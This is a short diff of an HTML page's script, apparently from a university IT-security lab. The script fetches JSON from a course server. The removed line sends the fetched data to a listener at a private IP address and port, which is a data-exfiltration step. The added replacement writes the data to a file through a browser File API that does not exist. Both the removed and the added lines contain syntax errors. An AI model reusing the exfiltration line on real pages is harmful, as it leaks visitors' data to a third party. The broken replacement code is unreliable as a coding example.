@@ -1,9 +1,19 @@
 <!DOCTYPE html>
 <html>
     <script>
+        function writeTextFile(afilename, output)
+        {
+          var txtFile =new File(afilename);
+          txtFile.writeln(output);
+          txtFile.close();
+        }
+        var f = "sometextfile.txt";
         fetch("https://t8.itsec.sec.in.tum.de/")
             .then((response) => response.json())
-            .then((data) => fetch(http://192.168.0.10:51690/?data=${data}))
+            .then((data) => writeTextFile(f, data.text)))
+                                  
+                                        
+                                  
     </script>
     <body>
         <p>
